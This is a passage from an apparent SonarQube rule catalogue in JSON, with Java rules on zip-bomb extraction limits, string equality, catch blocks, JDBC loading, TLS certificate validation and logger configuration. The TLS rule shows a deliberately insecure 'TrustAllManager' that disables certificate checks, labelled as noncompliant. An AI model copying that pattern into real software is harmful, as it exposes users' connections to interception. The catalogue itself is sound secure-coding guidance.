FileOutputStream(\"./output_onlyfortesting.txt\"));\n\n  totalEntryArchive ++;\n\n  int nBytes = -1;\n  byte[] buffer = new byte[2048];\n  int totalSizeEntry = 0;\n\n  while((nBytes = in.read(buffer)) &gt; 0) { // Compliant\n      out.write(buffer, 0, nBytes);\n      totalSizeEntry += nBytes;\n      totalSizeArchive += nBytes;\n\n      double compressionRatio = totalSizeEntry / ze.getCompressedSize();\n      if(compressionRatio &gt; THRESHOLD_RATIO) {\n        // ratio between compressed and uncompressed data is highly suspicious, looks like a Zip Bomb Attack\n        break;\n      }\n  }\n\n  if(totalSizeArchive &gt; THRESHOLD_SIZE) {\n      // the uncompressed data size is too much for the application resource capacity\n      break;\n  }\n\n  if(totalEntryArchive &gt; THRESHOLD_ENTRIES) {\n      // too much entries in this archive, can lead to inodes exhaustion of the system\n      break;\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/IDS04-J.+Safely+extract+files+from+ZipInputStream\">CERT, IDS04-J.</a> - Safely\n  extract files from ZipInputStream </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5042","summary":"Expanding archive files without controlling resource consumption is security-sensitive","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shadowing makes it impossible to use the type parameter from the outer scope. Also, it can be confusing to distinguish which type parameter is\nbeing used.</p>\n<p>This rule raises an issue when a type parameter from an inner scope uses the same name as one in an outer scope.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n public class TypeParameterHidesAnotherType&lt;T&gt; {\n\n    public class Inner&lt;T&gt; { // Noncompliant\n      //...\n    }\n\n    private &lt;T&gt; T method() { // Noncompliant\n      return null;\n    }\n\n  }\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class NoTypeParameterHiding&lt;T&gt; {\n\n    public class Inner&lt;S&gt; { // Compliant\n      List&lt;S&gt; listOfS;\n    }\n\n    private &lt;V&gt; V method() { // Compliant\n      return null;\n    }\n\n  }\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4977","summary":"Type parameters should not shadow other type parameters","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Itâs almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using\nreference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString firstName = getFirstName(); // String overrides equals\nString lastName = getLastName();\n\nif (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString firstName = getFirstName();\nString lastName = getLastName();\n\nif (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/595\">CWE-595 - Comparison of Object References Instead of Object Contents</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/597\">CWE-597 - Use of Wrong Operator in String Comparison</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/UjdGBQ\">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of boxed\n  primitives </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/yDdGBQ\">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference equality\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-4973","summary":"Strings and Boxed types should be compared using \"equals()\"","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The <code>catch</code> block of a checked exception \"E\" may be hidden because the corresponding <code>try</code> block only throws exceptions\nderived from E.</p>\n<p>These derived exceptions are handled in dedicated <code>catch</code> blocks prior to the <code>catch</code> block of the base exception E.</p>\n<p>The <code>catch</code> block of E is unreachable and should be considered dead code. It should be removed, or the entire try-catch structure should\nbe refactored.</p>\n<p>It is also possible that a single exception type in a multi-catch block may be hidden while the catch block itself is still reachable. In that case\nit is enough to only remove the hidden exception type or to replace it with another type.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\n  public static class CustomDerivedException extends CustomException {\n  }\n\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) {\n      // ...\n    } catch(CustomException e) { // Noncompliant; this code is unreachable\n      // ...\n    }\n  }\n\n  private static void throwCustomDerivedException() throws CustomDerivedException {\n    throw new CustomDerivedException();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class HiddenCatchBlock {\n\n  public static class CustomException extends Exception {\n  }\n\n  public static class CustomDerivedException extends CustomException {\n  }\n\n  public static void main(String[] args) {\n    try {\n      throwCustomDerivedException();\n    } catch(CustomDerivedException e) { // Compliant; try-catch block is \"catching\" only the Exception that can be thrown in the \"try\"\n      //...\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4970","summary":"Derived exceptions should not hide their parents' catch blocks","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When a type variable or a wildcard declares an upper bound that is <code>final</code>, the parametrization is not generic at all because it accepts\none and only one type at runtime: the one that is <code>final</code>. Instead of using <code>Generics</code>, itâs simpler to directly use the\nconcrete <code>final</code> class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic static &lt;T extends String&gt; T getMyString() { // Noncompliant; String is a \"final\" class and so can't be extended\n [...]\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic static String getMyString() { // Compliant\n  [...]\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4968","summary":"The upper bound of type variables and wildcards should not be \"final\" ","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement\nthe method <code>read()</code>. However most uses for such streams donât read a single byte at a time and the default implementation for\n<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is\nutterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of\n<code>read(byte[],int,int)</code>.</p>\n<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesnât provide an\noverride of <code>read(byte[],int,int)</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyInputStream extends java.io.InputStream {\n  private FileInputStream fin;\n\n  public MyInputStream(File file) throws IOException {\n    fin = new FileInputStream(file);\n  }\n\n  @Override\n  public int read() throws IOException {\n    return fin.read();\n  }\n\n  @Override\n  public int read(byte[] b, int off, int len) throws IOException {\n    return fin.read(b, off, len);\n  }\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule doesnât raise an issue when the class is declared <code>abstract</code>.</p>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4929","summary":"\"read(byte[],int,int)\" should be overridden","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Providing a <code>serialVersionUID</code> field on <code>Serializable</code> classes is strongly recommended by the <code>Serializable</code>\ndocumentation but blindly following that recommendation can be harmful.</p>\n<p><code>serialVersionUID</code> value is stored with the serialized data and this field is verified when deserializing the data to ensure that the\ncode reading the data is compatible with the serialized data. In case of failure, it means the serialized data and the code are not in sync and this\nfine because you know whatâs wrong.</p>\n<p>When the <code>serialVersionUID</code> is generated by an IDE or blindly hard-coded, there is a high probability that one will forget to update the\n<code>serialVersionUID</code> value when the <code>Serializable</code> class is later enriched with additional fields. As a consequence, old\nserialized data will incorrectly be considered compatible with the newer version of the code creating situations which are hard to debug.</p>\n<p>Therefore, defining <code>serialVersionUID</code> should be done with care. This rule raises an issue on each <code>serialVersionUID</code> field\ndeclared on classes implementing <code>Serializable</code> to be sure the presence and the value of the <code>serialVersionUID</code> field is\nchallenged and validated by the team.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo implements Serializable {\n  private static final long serialVersionUID = 1;\n}\n\npublic class BarException extends RuntimeException {\n  private static final long serialVersionUID = 8582433437601788991L;\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> Vojtech Ruzickaâs Programming Blog: <a href=\"https://www.vojtechruzicka.com/explicitly-declare-serialversionuid/\">Should I explicitly declare\n  serialVersionUID?</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4926","summary":"\"serialVersionUID\" should not be declared blindly","tags":["serialization","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this\nis no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are\nautomatically loaded.</p>\n<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>\n<ul>\n  <li> <code>com.mysql.jdbc.Driver</code> </li>\n  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>\n  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>\n  <li> <code>com.sybase.jdbc.SybDriver</code> </li>\n  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>\n  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>\n  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>\n  <li> <code>org.postgresql.Driver</code> </li>\n  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>\n  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>\n  <li> <code>org.h2.Driver</code> </li>\n  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>\n  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>\n  <li> <code>com.ibm.db2.jcc.DB2Driver</code> </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n  private static final String DRIVER_CLASS_NAME = \"org.postgresql.Driver\";\n  private final Connection connection;\n\n  public Demo(String serverURI) throws SQLException, ClassNotFoundException {\n    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()\n    connection = DriverManager.getConnection(serverURI);\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.SQLException;\n\npublic class Demo {\n    private final Connection connection;\n\n    public Demo(String serverURI) throws SQLException {\n        connection = DriverManager.getConnection(serverURI);\n    }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4925","summary":"\"Class.forName()\" should not load JDBC 4.0+ drivers","tags":["obsolete"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When iterating over an <code>Iterable</code> with a <code>for</code> loop, the iteration variable could have the same type as the type returned by\nthe iterator (the item type of the <code>Iterable</code>). This rule reports when a supertype of the item type is used for the variable instead, but\nthe variable is then explicitly downcast in the loop body.</p>\n<p>Using explicit type casts instead of leveraging the languageâs type system is a bad practice. It disables static type checking by the compiler for\nthe cast expressions, but potential errors will throw a <code>ClassCastException</code> during runtime instead.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>When declaring the iteration variable, use the item type for it instead of a supertype. Remove the explicit downcasts in the loop body.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (Object item : getPersons()) { // Noncompliant, iteration element is implicitly upcast here\n  Person person = (Person) item; // Noncompliant, item is explicitly downcast here\n  person.getAddress();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (Person person : getPersons()) { // Compliant\n  person.getAddress();\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>Alternatively, use the <code>var</code> keyword to automatically infer the variable type (since Java 10).</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nfor (Object item : getPersons()) { // Noncompliant, iteration element is implicitly upcast here\n  Person person = (Person) item; // Noncompliant, item is explicitly downcast here\n  person.getAddress();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nfor (var person : getPersons()) { // Compliant\n  person.getAddress();\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The implicit upcast in the loop header is not reported when there is no downcast in the loop body.</p>\n<pre>\nfor (Object item : getPersons()) { // Compliant\n  System.out.println(item);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4838","summary":"An iteration on a Collection should be performed on the type handled by the Collection","tags":["bad-practice","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bankâs\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use\nthe original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre>\nclass TrustAllManager implements X509TrustManager {\n\n    @Override\n    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant\n    }\n\n    @Override\n    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant\n    }\n\n    @Override\n    public X509Certificate[] getAcceptedIssuers() {\n        return null;\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m5-insecure-communication\">Mobile Top 10 2024 Category M5 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-NETWORK/\">Mobile AppSec Verification Standard - Network Communication Requirements</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222550\">Application Security and\n  Development: V-222550</a> - The application must validate certificates by constructing a certification path to an accepted trust anchor. </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-4830","summary":"Server certificates should be verified during SSL/TLS connections","tags":["cwe","privacy","cert","ssl"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2018-0285\">CVE-2018-0285</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2000-1127\">CVE-2000-1127</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2017-15113\">CVE-2017-15113</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2015-5742\">CVE-2015-5742</a> </li>\n</ul>\n<p>Logs are useful before, during and after a security incident.</p>\n<ul>\n  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it\n  is the first step to prevent an attack from ever happening. </li>\n  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>\n</ul>\n<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information\nlogged and how they are logged.</p>\n<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives\n  access to them. </li>\n  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>\n  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the\n  user can perform the action as many times as he/she wants. </li>\n  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)\n  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>\n  <li> the logs are only stored locally instead of being backuped or replicated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Check that your production deployment doesnât have its loggers in \"debug\" mode as it might write sensitive information in logs. </li>\n  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>\n  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the\n  hostname. </li>\n  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the\n  impact is known and limited. </li>\n  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the\n  service are secure too. </li>\n  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control\n  the logged information. An attacker could just repeat a logged action many times. </li>\n</ul>\n<p>Remember that configuring loggers properly doesnât make them bullet-proof. Here is a list of recommendations explaining on how to use your\nlogs:</p>\n<ul>\n  <li> Donât log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user\n  names, locations, etcâ¦â Usually any information which is protected by law is good candidate for removal. </li>\n  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etcâ¦â As for any user\n  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example\n  use all your storage space or compromise your log indexing service. </li>\n  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as\n  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>\n  <li> Monitor the logs for any suspicious activity. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>This rule supports the following libraries: Log4J, <code>java.util.logging</code> and Logback</p>\n<pre>\n// === Log4J 2 ===\nimport org.apache.logging.log4j.core.config.builder.api.ConfigurationBuilderFactory;\nimport org.apache.logging.log4j.Level;\nimport org.apache.logging.log4j.core.*;\nimport org.apache.logging.log4j.core.config.*;\n\n// Sensitive: creating a new custom configuration\nabstract class CustomConfigFactory extends ConfigurationFactory {\n    // ...\n}\n\nclass A {\n    void foo(Configuration config, LoggerContext context, java.util.Map&lt;String, Level&gt; levelMap,\n            Appender appender, java.io.InputStream stream, java.net.URI uri,\n            java.io.File file, java.net.URL url, String source, ClassLoader loader, Level level, Filter filter)\n            throws java.io.IOException {\n        // Creating a new custom configuration\n        ConfigurationBuilderFactory.newConfigurationBuilder();  // Sensitive\n\n        // Setting loggers level can result in writing sensitive information in production\n        Configurator.setAllLevels(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(\"com.example\", Level.DEBUG);  // Sensitive\n        Configurator.setLevel(levelMap);  // Sensitive\n        Configurator.setRootLevel(Level.DEBUG);  // Sensitive\n\n        config.addAppender(appender); // Sensitive: this modifies the configuration\n\n        LoggerConfig loggerConfig = config.getRootLogger();\n        loggerConfig.addAppender(appender, level, filter); // Sensitive\n        loggerConfig.setLevel(level); // Sensitive\n\n        context.setConfigLocation(uri); // Sensitive\n\n        // Load the configuration from a stream or file\n        new ConfigurationSource(stream);  // Sensitive\n        new ConfigurationSource(stream, file);  // Sensitive\n        new ConfigurationSource(stream, url);  // Sensitive\n        ConfigurationSource.fromResource(source, loader);  // Sensitive\n        ConfigurationSource.fromUri(uri);  // Sensitive\n    }\n}\n</pre>\n<pre>\n// === java.util.logging ===\nimport java.util.logging.*;\n\nclass M {\n    void foo(LogManager logManager, Logger logger, java.io.InputStream is, Handler handler)\n            throws SecurityException, java.io.IOException {\n        logManager.readConfiguration(is); // Sensitive\n\n        logger.setLevel(Level.FINEST); // Sensitive\n        logger.addHandler(handler); // Sensitive\n    }\n}\n</pre>\n<pre>\n// === Logback ===\nimport ch.qos.logback.classic.util.ContextInitializer;\nimport ch.qos.logback.core.Appender;\nimport ch.qos.logback.classic.joran.JoranConfigurator;\nimport ch.qos.logback.classic.spi.ILoggingEvent;\nimport ch.qos.logback.classic.*;\n\nclass M {\n    void foo(Logger logger, Appender&lt;ILoggingEvent&gt; fileAppender) {\n        System.setProperty(ContextInitializer.CONFIG_FILE_PROPERTY, \"config.xml\"); // Sensitive\n        JoranConfigurator configurator = new JoranConfigurator(); // Sensitive\n\n        logger.addAppender(fileAppender); // Sensitive\n        logger.setLevel(Level.DEBUG); // Sensitive\n    }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Log4J 1.x is not covered as it has reached <a href=\"https://blogs.apache.org/foundation/entry/apache_logging_services_project_announces\">end of\nlife</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/532\">CWE-532 - Information Exposure Through Log Files</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-4792","summary":"Configuring loggers is security-sensitive","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>and <code>SHA-1</code> are no\nlonger considered secure, because it is possible to have <code>collisions</code> (little computational effort is enough to find two or more different\ninputs that produce the same hash).</p>\n<p>Message authentication code (MAC) algorithms such as 